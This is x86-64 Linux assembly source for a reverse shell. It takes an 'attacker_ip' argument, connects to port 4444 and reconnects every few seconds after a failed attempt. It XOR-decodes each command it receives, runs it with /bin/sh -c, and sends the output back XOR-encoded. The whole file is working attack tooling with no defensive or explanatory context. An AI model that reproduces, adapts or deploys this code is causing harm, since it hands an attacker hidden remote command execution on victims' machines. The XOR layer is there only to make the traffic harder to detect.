section .data
    timespec     dq 5, 0
    port_num     dw 4444
    xor_key      db 0x41, 0x42, 0x43, 0x44

    err_usage    db 'Usage: ./reverse <attacker_ip>',10,0
    err_usage_len equ $ - err_usage - 1
    err_ip_format db 'Error: Invalid IP format',10,0
    err_ip_format_len equ $ - err_ip_format - 1
    err_socket   db 'Error: Socket creation failed',10,0
    err_socket_len equ $ - err_socket - 1
    err_connect  db 'Error: Connection failed',10,0
    err_connect_len equ $ - err_connect - 1

    shell_path   db '/bin/sh', 0
    shell_c      db '-c', 0

section .bss
    ip_bytes     resd 1
    port_bytes   resw 1
    sockaddr     resb 16
    cmd_buffer   resb 4096
    result_buffer resb 8192

section .text
    global _start

;---------------------------------------------------------
;                   IP Validation
;---------------------------------------------------------

validate_and_parse_ip:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    push r13

    mov rsi, rdi
    xor rbx, rbx
    xor r12d, r12d
    xor r13d, r13d

.parse_loop:
    movzx edx, byte [rsi]
    test dl, dl
    jz .end_parse

    cmp dl, '.'
    je .store_octet

    cmp dl, '0'
    jb .invalid
    cmp dl, '9'
    ja .invalid

    sub dl, '0'
    imul r13d, r13d, 10
    add r13d, edx
    cmp r13d, 255
    ja .invalid

    inc rsi
    jmp .parse_loop

.store_octet:
    cmp bl, 3
    jae .invalid

    shl r12d, 8
    or r12d, r13d
    inc bl
    xor r13d, r13d
    inc rsi
    jmp .parse_loop

.end_parse:
    cmp bl, 3
    jne .invalid

    shl r12d, 8
    or r12d, r13d
    mov eax, r12d
    bswap eax
    mov [ip_bytes], eax
    mov rax, 1
    jmp .done

.invalid:
    xor rax, rax
.done:
    pop r13
    pop r12
    pop rbx
    pop rbp
    ret
;---------------------------------------------------------
;                       XOR Cipher 
;---------------------------------------------------------

xor_crypt:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    push r13

    mov r10, rdi
    mov r11, rsi
    mov r12d, edx
    xor r13, r13

.loop:
    cmp r13, r11
    jae .end

    mov ecx, r13d
    and ecx, 3
    shl ecx, 3

    mov eax, r12d
    shr eax, cl
    and al, 0xFF

    mov bl, [r10 + r13]
    xor bl, al
    mov [r10 + r13], bl

    inc r13
    jmp .loop

.end:
    pop r13
    pop r12
    pop rbx
    pop rbp
    ret
;---------------------------------------------------------
;                    Execute Command 
;---------------------------------------------------------

execute_command:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    push r13
    push r14
    push r15

    mov r12, rdi
    mov r13, rsi

    sub rsp, 8
    mov rax, 22
    mov rdi, rsp
    syscall

    test rax, rax
    js .error

    mov r14d, [rsp]
    mov r15d, [rsp+4]
    add rsp, 8

    mov rax, 57
    syscall

    test rax, rax
    jz .child_process
    js .error

    mov rbx, rax

    mov rax, 3
    mov rdi, r15
    syscall

.read_loop:
    mov rax, 0
    mov rdi, r14
    lea rsi, [result_buffer]
    mov rdx, 8192
    syscall

    test rax, rax
    jle .read_done

    mov r15, rax

    lea rdi, [result_buffer]
    mov rsi, r15
    mov edx, [xor_key]
    call xor_crypt

    mov rax, 1
    mov rdi, r13
    lea rsi, [result_buffer]
    mov rdx, r15
    syscall

    jmp .read_loop

.read_done:
    mov rax, 3
    mov rdi, r14
    syscall

    mov rax, 61
    mov rdi, rbx
    xor rsi, rsi
    xor rdx, rdx
    xor r10, r10
    syscall
    jmp .done

.child_process:
    mov rax, 33
    mov rdi, r15
    mov rsi, 1
    syscall

    mov rax, 33
    mov rdi, r15
    mov rsi, 2
    syscall

    mov rax, 3
    mov rdi, r14
    syscall
    mov rax, 3
    mov rdi, r15
    syscall

    sub rsp, 32
    lea rax, [shell_path]
    mov [rsp], rax
    lea rax, [shell_c]
    mov [rsp+8], rax
    mov [rsp+16], r12
    mov qword [rsp+24], 0

    mov rax, 59
    lea rdi, [shell_path]
    mov rsi, rsp
    xor rdx, rdx
    syscall

    mov rax, 60
    mov rdi, 1
    syscall

.error:
.done:
    pop r15
    pop r14
    pop r13
    pop r12
    pop rbx
    pop rbp
    ret
;-----------------------------------------------------
;                       Main Entry 
;-----------------------------------------------------

_start:
    pop rcx
    cmp rcx, 2
    jne usage_error

    pop rsi
    pop rdi

    test rdi, rdi
    jz usage_error

    call validate_and_parse_ip
    test rax, rax
    jz ip_error

    mov ax, [port_num]
    xchg al, ah
    mov [port_bytes], ax

connection_loop:
    mov rax, 41
    mov rdi, 2
    mov rsi, 1
    xor rdx, rdx
    syscall

    test rax, rax
    js socket_error
    mov r8, rax

    lea rdi, [sockaddr]
    mov word [rdi], 2
    mov ax, [port_bytes]
    mov word [rdi+2], ax
    mov eax, [ip_bytes]
    mov dword [rdi+4], eax
    mov qword [rdi+8], 0

    mov rax, 42
    mov rdi, r8
    lea rsi, [sockaddr]
    mov rdx, 16
    syscall

    test rax, rax
    js connect_error

    mov edx, [xor_key]
    mov r12d, edx

command_loop:
    mov rax, 0
    mov rdi, r8
    lea rsi, [cmd_buffer]
    mov rdx, 4096
    syscall

    test rax, rax
    jle exit_clean

    mov r13, rax

    lea rdi, [cmd_buffer]
    mov rsi, r13
    mov rdx, r12
    call xor_crypt

    mov byte [cmd_buffer + r13], 0

    lea rdi, [cmd_buffer]
    mov rsi, r8
    call execute_command

    jmp command_loop

exit_clean:
    mov rax, 3
    mov rdi, r8
    syscall
    jmp exit_program
;---------------------------------------------------------
;                       Error Handlers 
;---------------------------------------------------------

usage_error:
    mov rax, 1
    mov rdi, 2
    lea rsi, [err_usage]
    mov rdx, err_usage_len
    syscall
    jmp exit_program

ip_error:
    mov rax, 1
    mov rdi, 2
    lea rsi, [err_ip_format]
    mov rdx, err_ip_format_len
    syscall
    jmp exit_program

socket_error:
    mov rax, 1
    mov rdi, 2
    lea rsi, [err_socket]
    mov rdx, err_socket_len
    syscall
    jmp exit_program

connect_error:
    mov rax, 3
    mov rdi, r8
    syscall

    mov rax, 35
    lea rdi, [timespec]
    xor rsi, rsi
    syscall
    jmp connection_loop

exit_program:
    mov rax, 60
    xor rdi, rdi
    syscall
